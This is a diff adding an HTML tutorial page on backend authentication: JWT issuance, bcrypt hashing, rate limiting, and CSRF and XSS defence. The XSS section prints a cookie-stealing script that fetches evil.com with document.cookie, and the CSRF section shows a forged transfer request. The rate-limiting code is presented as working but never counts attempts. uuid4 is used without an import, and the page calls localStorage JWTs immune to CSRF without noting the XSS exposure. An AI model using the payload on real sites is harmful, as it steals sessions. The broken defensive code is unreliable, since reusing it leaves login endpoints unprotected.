+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>┌─────────────┐
+│    Client    │
+└──────┬──────┘
+       │
+       ▼
+┌─────────────────────────────────┐
+│         API Gateway             │
+│  - Rate Limiting                │
+│  - Token Validation             │
+└──────┬──────────────────────────┘
+       │
+       ▼
+┌─────────────────────────────────┐
+│      Auth Service               │
+│  - Registration, Login          │
+│  - Token Issuance &amp; Validation  │
+│  - OAuth 2.0 Integration        │
+└──────┬──────────────────────────┘
+       │
+       ▼
+┌─────────────────────────────────┐
+│    Business Services            │
+│  - User Service                 │
+│  - Order Service                │
+│  - Payment Service              │
+└─────────────────────────────────┘</pre>
+</div>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">4.3 Database Design</span><span lang="en">4.3 Database Design</span></h3>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>sql</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>-- Users table
+CREATE TABLE users (
+    id BIGINT PRIMARY KEY AUTO_INCREMENT,
+    username VARCHAR(50) UNIQUE NOT NULL,
+    password_hash VARCHAR(255) NOT NULL,  -- bcrypt hash
+    email VARCHAR(100) UNIQUE,
+    role ENUM(&#039;user&#039;, &#039;vip&#039;, &#039;admin&#039;) DEFAULT &#039;user&#039;,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_username (username),
+    INDEX idx_email (email)
+);
+
+-- Third-party login binding table
+CREATE TABLE user_auth_providers (
+    id BIGINT PRIMARY KEY AUTO_INCREMENT,
+    user_id BIGINT NOT NULL,
+    provider ENUM(&#039;wechat&#039;, &#039;google&#039;, &#039;github&#039;) NOT NULL,
+    provider_user_id VARCHAR(100) NOT NULL,  -- Third-party user ID
+    access_token TEXT,  -- Encrypted storage
+    refresh_token TEXT,
+    expires_at TIMESTAMP,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
+    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+-- Token blocklist (for proactive logout)
+CREATE TABLE token_blacklist (
+    id BIGINT PRIMARY KEY AUTO_INCREMENT,
+    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT JTI (unique identifier)
+    expired_at TIMESTAMP NOT NULL,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    INDEX idx_expired_at (expired_at)
+);</pre>
+</div>
+<p class="reveal"><span lang="id"><AuthDatabaseDemo /></span><span lang="en"><AuthDatabaseDemo /></span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">4.4 Code Implementation</span><span lang="en">4.4 Code Implementation</span></h3>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre># auth_service.py
+import bcrypt
+import jwt
+from datetime import datetime, timedelta
+
+SECRET_KEY = &quot;your-secret-key-here&quot;  # Use an environment variable in production
+
+class AuthService:
+    def register(self, username: str, password: str, email: str = None):
+        # 1. Check if the username already exists
+        if db.get_user_by_username(username):
+            raise ValueError(&quot;Username already exists&quot;)
+
+        # 2. Hash the password (bcrypt)
+        password_hash = bcrypt.hashpw(
+            password.encode(&#039;utf-8&#039;),
+            bcrypt.gensalt(rounds=12)
+        ).decode(&#039;utf-8&#039;)
+
+        # 3. Create the user
+        user = db.create_user(
+            username=username,
+            password_hash=password_hash,
+            email=email
+        )
+
+        # 4. Issue Tokens
+        return self._generate_tokens(user)
+
+    def login(self, username: str, password: str):
+        # 1. Look up the user
+        user = db.get_user_by_username(username)
+        if not user:
+            raise ValueError(&quot;Incorrect username or password&quot;)
+
+        # 2. Verify the password
+        if not bcrypt.checkpw(
+            password.encode(&#039;utf-8&#039;),
+            user.password_hash.encode(&#039;utf-8&#039;)
+        ):
+            raise ValueError(&quot;Incorrect username or password&quot;)
+
+        # 3. Issue Tokens
+        return self._generate_tokens(user)
+
+    def _generate_tokens(self, user):
+        now = datetime.now()
+
+        # Access Token (short-lived, e.g., 1 hour)
+        access_token = jwt.encode(
+            {
+                &quot;user_id&quot;: user.id,
+                &quot;role&quot;: user.role,
+                &quot;type&quot;: &quot;access&quot;,
+                &quot;iat&quot;: now,
+                &quot;exp&quot;: now + timedelta(hours=1),
+                &quot;jti&quot;: str(uuid4())  # Unique identifier
+            },
+            SECRET_KEY,
+            algorithm=&quot;HS256&quot;
+        )
+
+        # Refresh Token (long-lived, e.g., 30 days)
+        refresh_token = jwt.encode(
+            {
+                &quot;user_id&quot;: user.id,
+                &quot;type&quot;: &quot;refresh&quot;,
+                &quot;iat&quot;: now,
+                &quot;exp&quot;: now + timedelta(days=30),
+                &quot;jti&quot;: str(uuid4())
+            },
+            SECRET_KEY,
+            algorithm=&quot;HS256&quot;
+        )
+
+        return {
+            &quot;access_token&quot;: access_token,
+            &quot;refresh_token&quot;: refresh_token,
+            &quot;token_type&quot;: &quot;Bearer&quot;,
+            &quot;expires_in&quot;: 3600  # access_token expiration time (seconds)
+        }
+
+    def refresh(self, refresh_token: str):
+        try:
+            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+            if payload.get(&quot;type&quot;) != &quot;refresh&quot;:
+                raise ValueError(&quot;Invalid token type&quot;)
+
+            user = db.get_user_by_id(payload[&quot;user_id&quot;])
+            return self._generate_tokens(user)
+        except jwt.ExpiredSignatureError:
+            raise ValueError(&quot;Refresh token has expired&quot;)
+        except jwt.InvalidTokenError:
+            raise ValueError(&quot;Refresh token is invalid&quot;)
+
+    def logout(self, token: str):
+        # Add the Token to the blocklist
+        payload = jwt.decode(token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+        db.add_to_blacklist(
+            jti=payload[&quot;jti&quot;],
+            expired_at=datetime.fromtimestamp(payload[&quot;exp&quot;])
+        )
+
+    def verify_token(self, token: str):
+        try:
+            payload = jwt.decode(token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+
+            # Check if it&#039;s in the blocklist
+            if db.is_token_blacklisted(payload[&quot;jti&quot;]):
+                raise ValueError(&quot;Token has been revoked&quot;)
+
+            return payload
+        except jwt.ExpiredSignatureError:
+            raise ValueError(&quot;Token has expired&quot;)
+        except jwt.InvalidTokenError:
+            raise ValueError(&quot;Token is invalid&quot;)
+
+# API decorators
+def require_auth(auth_service: AuthService):
+    def decorator(f):
+        def wrapper(*args, **kwargs):
+            # Get Token from Header
+            auth_header = request.headers.get(&quot;Authorization&quot;)
+            if not auth_header or not auth_header.startswith(&quot;Bearer &quot;):
+                return {&quot;error&quot;: &quot;No Token provided&quot;}, 401
+
+            token = auth_header.split(&quot; &quot;)[1]
+
+            try:
+                # Verify Token
+                payload = auth_service.verify_token(token)
+                # Inject user information into the request context
+                request.user = payload
+                return f(*args, **kwargs)
+            except ValueError as e:
+                return {&quot;error&quot;: str(e)}, 401
+
+        return wrapper
+    return decorator
+
+def require_role(*roles):
+    def decorator(f):
+        def wrapper(*args, **kwargs):
+            if not hasattr(request, &quot;user&quot;):
+                return {&quot;error&quot;: &quot;Not logged in&quot;}, 401
+
+            if request.user[&quot;role&quot;] not in roles:
+                return {&quot;error&quot;: &quot;Insufficient permissions&quot;}, 403
+
+            return f(*args, **kwargs)
+        return wrapper
+    return decorator
+
+# Usage example
+@app.route(&quot;/api/admin/users&quot;, methods=[&quot;GET&quot;])
+@require_auth(auth_service)
+@require_role(&quot;admin&quot;)
+def get_users():
+    users = db.get_all_users()
+    return {&quot;users&quot;: users}
+
+@app.route(&quot;/api/user/profile&quot;, methods=[&quot;GET&quot;])
+@require_auth(auth_service)
+def get_profile():
+    user = db.get_user_by_id(request.user[&quot;user_id&quot;])
+    return {&quot;user&quot;: user}
+
+@app.route(&quot;/auth/refresh&quot;, methods=[&quot;POST&quot;])
+def refresh_token():
+    refresh_token = request.json.get(&quot;refresh_token&quot;)
+    try:
+        tokens = auth_service.refresh(refresh_token)
+        return tokens
+    except ValueError as e:
+        return {&quot;error&quot;: str(e)}, 401</pre>
+</div>
+<p class="reveal"><span lang="id"><CompleteAuthSystemDemo /></span><span lang="en"><CompleteAuthSystemDemo /></span></p>
+<p class="reveal"><span lang="id">---</span><span lang="en">---</span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">5. Security Best Practices</span><span lang="en">5. Security Best Practices</span></h2>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">5.1 Password Storage</span><span lang="en">5.1 Password Storage</span></h3>
+<p class="reveal"><span lang="id"><b>❌ Wrong approach</b>:</span><span lang="en"><b>❌ Wrong approach</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre># Plaintext storage (absolutely not!)
+db.save_password(username, password)
+
+# MD5 / SHA1 hashing (not secure enough — vulnerable to rainbow table attacks)
+hash = md5(password)
+db.save_password(username, hash)</pre>
+</div>
+<p class="reveal"><span lang="id"><b>✅ Correct approach</b>:</span><span lang="en"><b>✅ Correct approach</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre># bcrypt (adaptive hashing; slow hashing prevents brute-force attacks)
+import bcrypt
+
+password_hash = bcrypt.hashpw(
+    password.encode(&#039;utf-8&#039;),
+    bcrypt.gensalt(rounds=12)  # More rounds = more secure, but also slower
+)
+
+# Verification
+if bcrypt.checkpw(password.encode(&#039;utf-8&#039;), password_hash):
+    # Password is correct</pre>
+</div>
+<p class="reveal"><span lang="id"><b>Why bcrypt?</b></span><span lang="en"><b>Why bcrypt?</b></span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Slow</b>: Deliberately designed to be slow (millisecond-level) to prevent brute-force attacks.</span><span lang="en"><b>Slow</b>: Deliberately designed to be slow (millisecond-level) to prevent brute-force attacks.</span></li>
+<li><span lang="id"><b>Adaptive</b>: You can adjust the rounds to strengthen it as hardware improves.</span><span lang="en"><b>Adaptive</b>: You can adjust the rounds to strengthen it as hardware improves.</span></li>
+<li><span lang="id"><b>Salted</b>: Includes a built-in random salt to prevent rainbow table attacks.</span><span lang="en"><b>Salted</b>: Includes a built-in random salt to prevent rainbow table attacks.</span></li>
+</ul>
+<p class="reveal"><span lang="id"><PasswordHashingDemo /></span><span lang="en"><PasswordHashingDemo /></span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">5.2 Brute-Force Prevention</span><span lang="en">5.2 Brute-Force Prevention</span></h3>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Rate Limiting</b>: The same IP / username can only attempt 5 times per minute.</span><span lang="en"><b>Rate Limiting</b>: The same IP / username can only attempt 5 times per minute.</span></li>
+<li><span lang="id"><b>CAPTCHA</b>: Require a CAPTCHA after 3 failed attempts.</span><span lang="en"><b>CAPTCHA</b>: Require a CAPTCHA after 3 failed attempts.</span></li>
+<li><span lang="id"><b>Account Lockout</b>: Lock the account for 30 minutes after 10 failed attempts.</span><span lang="en"><b>Account Lockout</b>: Lock the account for 30 minutes after 10 failed attempts.</span></li>
+</ul>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>from functools import lru_cache
+import time
+
+@lru_cache(maxsize=10000)
+def get_login_attempts(identifier: str) -&gt; tuple:
+    &quot;&quot;&quot;Returns (attempt count, time of first attempt)&quot;&quot;&quot;
+    return (0, 0)
+
+def check_rate_limit(identifier: str):
+    attempts, first_attempt = get_login_attempts(identifier)
+    now = time.time()
+
+    # Reset after 1 minute
+    if now - first_attempt &gt; 60:
+        get_login_attempts.cache_clear()
+        return True
+
+    # Reject if over 5 attempts
+    if attempts &gt;= 5:
+        return False
+
+    return True
+
+def record_login_attempt(identifier: str):
+    attempts, first_attempt = get_login_attempts(identifier)
+    if attempts == 0:
+        first_attempt = time.time()
+    get_login_attempts.cache_clear()
+    get_login_attempts(identifier)  # Re-cache
+
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.json[&quot;username&quot;]
+
+    # Check rate limit
+    if not check_rate_limit(username):
+        return {&quot;error&quot;: &quot;Too many attempts. Please try again in 1 minute.&quot;}, 429
+
+    password = request.json[&quot;password&quot;]
+
+    # Verify password
+    user = db.get_user_by_username(username)
+    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
+        # Login successful — clear the counter
+        get_login_attempts.cache_clear()
+        return {&quot;token&quot;: generate_token(user)}
+    else:
+        # Login failed — record the attempt
+        record_login_attempt(username)
+        return {&quot;error&quot;: &quot;Incorrect username or password&quot;}, 401</pre>
+</div>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">5.3 CSRF Prevention (Cross-Site Request Forgery)</span><span lang="en">5.3 CSRF Prevention (Cross-Site Request Forgery)</span></h3>
+<p class="reveal"><span lang="id"><b>Attack Scenario</b>:</span><span lang="en"><b>Attack Scenario</b>:</span></p>
+<p class="reveal"><span lang="id">You log into your bank's website <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">bank.com</code>, then visit a malicious website <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">evil.com</code>. The page on <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">evil.com</code> contains this code:</span><span lang="en">You log into your bank's website <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">bank.com</code>, then visit a malicious website <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">evil.com</code>. The page on <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">evil.com</code> contains this code:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>html</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>&lt;img src=&quot;https://bank.com/api/transfer?to=attacker&amp;amount=10000&quot; /&gt;</pre>
+</div>
+<p class="reveal"><span lang="id">Your browser will send this request with the bank's Cookie (cross-origin request), causing funds to be transferred without your knowledge.</span><span lang="en">Your browser will send this request with the bank's Cookie (cross-origin request), causing funds to be transferred without your knowledge.</span></p>
+<p class="reveal"><span lang="id"><b>Defense Measures</b>:</span><span lang="en"><b>Defense Measures</b>:</span></p>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>CSRF Token</b>:</span><span lang="en"><b>CSRF Token</b>:</span></li>
+<li><span lang="id">The server generates a random Token and places it in a form field.</span><span lang="en">The server generates a random Token and places it in a form field.</span></li>
+<li><span lang="id">Verify that the Token matches on submission.</span><span lang="en">Verify that the Token matches on submission.</span></li>
+</ul>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>from flask import session
+
+@app.route(&quot;/api/transfer&quot;, methods=[&quot;POST&quot;])
+def transfer():
+    # Verify CSRF Token
+    token = request.headers.get(&quot;X-CSRF-Token&quot;)
+    if token != session.get(&quot;csrf_token&quot;):
+        return {&quot;error&quot;: &quot;CSRF Token is invalid&quot;}, 403
+
+    # Execute the transfer
+    ...</pre>
+</div>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>SameSite Cookie</b>:</span><span lang="en"><b>SameSite Cookie</b>:</span></li>
+<li><span lang="id">Set the Cookie's <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">SameSite</code> attribute to <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">Strict</code> or <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">Lax</code>.</span><span lang="en">Set the Cookie's <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">SameSite</code> attribute to <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">Strict</code> or <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">Lax</code>.</span></li>
+</ul>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre># Flask example
+app.config.update(
+    SESSION_COOKIE_SAMESITE=&#039;Lax&#039;,  # or &#039;Strict&#039;
+    SESSION_COOKIE_SECURE=True      # HTTPS only
+)</pre>
+</div>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Use JWT (no Cookies)</b>:</span><span lang="en"><b>Use JWT (no Cookies)</b>:</span></li>
+<li><span lang="id">JWT is stored in <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">localStorage</code> and is not automatically attached to requests — naturally immune to CSRF.</span><span lang="en">JWT is stored in <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">localStorage</code> and is not automatically attached to requests — naturally immune to CSRF.</span></li>
+</ul>
+<p class="reveal"><span lang="id"><CSRFDefenseDemo /></span><span lang="en"><CSRFDefenseDemo /></span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">5.4 XSS Prevention (Cross-Site Scripting)</span><span lang="en">5.4 XSS Prevention (Cross-Site Scripting)</span></h3>
+<p class="reveal"><span lang="id"><b>Attack Scenario</b>:</span><span lang="en"><b>Attack Scenario</b>:</span></p>
+<p class="reveal"><span lang="id">A malicious user enters the following in a comment section:</span><span lang="en">A malicious user enters the following in a comment section:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>html</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>&lt;script&gt;
+  fetch(&#039;https://evil.com/steal?cookie=&#039; + document.cookie)
+&lt;/script&gt;</pre>
+</div>
+<p class="reveal"><span lang="id">If the website renders this content directly, other users' Cookies will be stolen.</span><span lang="en">If the website renders this content directly, other users' Cookies will be stolen.</span></p>
+<p class="reveal"><span lang="id"><b>Defense Measures</b>:</span><span lang="en"><b>Defense Measures</b>:</span></p>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Output Escaping</b>:</span><span lang="en"><b>Output Escaping</b>:</span></li>
+<li><span lang="id">Convert <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px"><</code> to <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">&lt;</code> and <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">></code> to <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">&gt;</code>.</span><span lang="en">Convert <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px"><</code> to <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">&lt;</code> and <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">></code> to <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">&gt;</code>.</span></li>
+</ul>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>import html
+
+def render_comment(comment):
+    # Escape HTML
+    safe_comment = html.escape(comment)
+    return f&quot;&lt;div class=&#039;comment&#039;&gt;{safe_comment}&lt;/div&gt;&quot;</pre>
+</div>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Content Security Policy (CSP)</b>:</span><span lang="en"><b>Content Security Policy (CSP)</b>:</span></li>
+<li><span lang="id">Set an HTTP header to restrict script sources.</span><span lang="en">Set an HTTP header to restrict script sources.</span></li>
+</ul>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>http</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>Content-Security-Policy: default-src &#039;self&#039;; script-src &#039;self&#039; https://cdn.example.com</pre>
+</div>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>HttpOnly Cookie</b>:</span><span lang="en"><b>HttpOnly Cookie</b>:</span></li>
+<li><span lang="id">Set the Cookie's <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">HttpOnly</code> attribute so JavaScript cannot read it.</span><span lang="en">Set the Cookie's <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">HttpOnly</code> attribute so JavaScript cannot read it.</span></li>
+</ul>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>app.config.update(
+    SESSION_COOKIE_HTTPONLY=True
+)</pre>
+</div>
+<p class="reveal"><span lang="id"><XSSDefenseDemo /></span><span lang="en"><XSSDefenseDemo /></span></p>
+<p class="reveal"><span lang="id">---</span><span lang="en">---</span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">6. Summary & Learning Roadmap</span><span lang="en">6. Summary & Learning Roadmap</span></h2>
+<p class="reveal"><span lang="id">Authentication is a "fundamental skill" of backend systems. Mastering it is essential to building secure and reliable applications.</span><span lang="en">Authentication is a "fundamental skill" of backend systems. Mastering it is essential to building secure and reliable applications.</span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">6.1 Core Knowledge Points</span><span lang="en">6.1 Core Knowledge Points</span></h3>
+<div class="table-wrap reveal" style="overflow-x:auto;margin:20px 0"><table>
+<tr><th>Topic</th><th>Importance</th><th>Difficulty</th><th>Real-World Frequency</th></tr>
+<tr><td><b>Session + Cookie</b></td><td>⭐⭐⭐⭐</td><td>Medium</td><td>High</td></tr>
+<tr><td><b>JWT</b></td><td>⭐⭐⭐⭐⭐</td><td>Low</td><td>Very High</td></tr>
+<tr><td><b>OAuth 2.0</b></td><td>⭐⭐⭐⭐</td><td>High</td><td>High</td></tr>
+<tr><td><b>Password Hashing (bcrypt)</b></td><td>⭐⭐⭐⭐⭐</td><td>Low</td><td>Very High</td></tr>
+<tr><td><b>Rate Limiting & Anti-Brute-Force</b></td><td>⭐⭐⭐⭐⭐</td><td>Medium</td><td>Very High</td></tr>
+<tr><td><b>CSRF Defense</b></td><td>⭐⭐⭐⭐</td><td>Medium</td><td>Medium</td></tr>
+<tr><td><b>XSS Defense</b></td><td>⭐⭐⭐⭐</td><td>Low</td><td>High</td></tr>
+</table></div>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">6.2 Learning Roadmap</span><span lang="en">6.2 Learning Roadmap</span></h3>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Getting Started</b> (1–2 days):</span><span lang="en"><b>Getting Started</b> (1–2 days):</span></li>
+<li><span lang="id">Understand authentication vs. authorization.</span><span lang="en">Understand authentication vs. authorization.</span></li>
+<li><span lang="id">Master the principles of Session + Cookie.</span><span lang="en">Master the principles of Session + Cookie.</span></li>
+<li><span lang="id">Implement a simple login and registration feature.</span><span lang="en">Implement a simple login and registration feature.</span></li>
+</ul>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Intermediate</b> (1 week):</span><span lang="en"><b>Intermediate</b> (1 week):</span></li>
+<li><span lang="id">Learn the principles and implementation of JWT.</span><span lang="en">Learn the principles and implementation of JWT.</span></li>
+<li><span lang="id">Implement a JWT-based authentication system.</span><span lang="en">Implement a JWT-based authentication system.</span></li>
+<li><span lang="id">Master password hashing (bcrypt).</span><span lang="en">Master password hashing (bcrypt).</span></li>
+</ul>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Practical Application</b> (2–4 weeks):</span><span lang="en"><b>Practical Application</b> (2–4 weeks):</span></li>
+<li><span lang="id">Integrate OAuth 2.0 (WeChat, Google login).</span><span lang="en">Integrate OAuth 2.0 (WeChat, Google login).</span></li>
+<li><span lang="id">Implement rate limiting and brute-force prevention.</span><span lang="en">Implement rate limiting and brute-force prevention.</span></li>
+<li><span lang="id">Defend against CSRF, XSS, and other common attacks.</span><span lang="en">Defend against CSRF, XSS, and other common attacks.</span></li>
+</ul>
+<ol class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Going Deeper</b> (ongoing):</span><span lang="en"><b>Going Deeper</b> (ongoing):</span></li>
+<li><span lang="id">Study RBAC (Role-Based Access Control).</span><span lang="en">Study RBAC (Role-Based Access Control).</span></li>
+<li><span lang="id">Research SSO (Single Sign-On).</span><span lang="en">Research SSO (Single Sign-On).</span></li>
+<li><span lang="id">Explore Zero Trust Architecture.</span><span lang="en">Explore Zero Trust Architecture.</span></li>
+</ul>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">6.3 Recommended Resources</span><span lang="en">6.3 Recommended Resources</span></h3>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Standards</b>:</span><span lang="en"><b>Standards</b>:</span></li>
+<li><span lang="id">RFC 6749 (OAuth 2.0)</span><span lang="en">RFC 6749 (OAuth 2.0)</span></li>
+<li><span lang="id">RFC 7519 (JWT)</span><span lang="en">RFC 7519 (JWT)</span></li>
+<li><span lang="id"><b>Articles</b>:</span><span lang="en"><b>Articles</b>:</span></li>
+<li><span lang="id">JWT.io: https://jwt.io/</span><span lang="en">JWT.io: https://jwt.io/</span></li>
+<li><span lang="id">OAuth 2.0 Simplified: https://oauth.net/2/</span><span lang="en">OAuth 2.0 Simplified: https://oauth.net/2/</span></li>
+<li><span lang="id"><b>Tools</b>:</span><span lang="en"><b>Tools</b>:</span></li>
+<li><span lang="id">jwt.io (Online JWT debugger)</span><span lang="en">jwt.io (Online JWT debugger)</span></li>
+<li><span lang="id">Postman (API testing)</span><span lang="en">Postman (API testing)</span></li>
+</ul>
+<p class="reveal"><span lang="id">---</span><span lang="en">---</span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">7. Glossary</span><span lang="en">7. Glossary</span></h2>
+<div class="table-wrap reveal" style="overflow-x:auto;margin:20px 0"><table>
+<tr><th>Term</th><th>Full Name</th><th>Explanation</th></tr>
+<tr><td><b>AuthN</b></td><td>Authentication</td><td><b>Authentication</b>. Verifies "who you are" (e.g., entering a password to verify identity).</td></tr>
+<tr><td><b>AuthZ</b></td><td>Authorization</td><td><b>Authorization</b>. Verifies "what you can do" (e.g., only admins can delete).</td></tr>
+<tr><td><b>Session</b></td><td>-</td><td><b>Session</b>. Server-side user state information.</td></tr>
+<tr><td><b>Cookie</b></td><td>-</td><td><b>Cookie</b>. A small piece of data stored by the browser, automatically sent with every request.</td></tr>
+<tr><td><b>JWT</b></td><td>JSON Web Token</td><td><b>JSON Web Token</b>. A stateless authentication scheme consisting of Header, Payload, and Signature.</td></tr>
+<tr><td><b>OAuth 2.0</b></td><td>-</td><td><b>Open Authorization</b>. A standardized framework for third-party login (e.g., "Log in with WeChat").</td></tr>
+<tr><td><b>SSO</b></td><td>Single Sign-On</td><td><b>Single Sign-On</b>. Log in once to access multiple applications (e.g., Google account across all Google services).</td></tr>
+<tr><td><b>RBAC</b></td><td>Role-Based Access Control</td><td><b>Role-Based Access Control</b>. Determines permissions based on a user's role (e.g., admin, user).</td></tr>
+<tr><td><b>CSRF</b></td><td>Cross-Site Request Forgery</td><td><b>Cross-Site Request Forgery</b>. An attacker tricks a user into sending a malicious request (e.g., using your Cookie to initiate a transfer).</td></tr>
+<tr><td><b>XSS</b></td><td>Cross-Site Scripting</td><td><b>Cross-Site Scripting</b>. An attacker injects malicious scripts into a web page (e.g., stealing Cookies).</td></tr>
+<tr><td><b>bcrypt</b></td><td>-</td><td><b>Password Hashing Algorithm</b>. A slow hashing algorithm specifically designed for password storage; prevents brute-force attacks.</td></tr>
+<tr><td><b>Access Token</b></td><td>-</td><td><b>Access Token</b>. A short-lived token used to access APIs.</td></tr>
+<tr><td><b>Refresh Token</b></td><td>-</td><td><b>Refresh Token</b>. A long-lived token used to obtain a new Access Token.</td></tr>
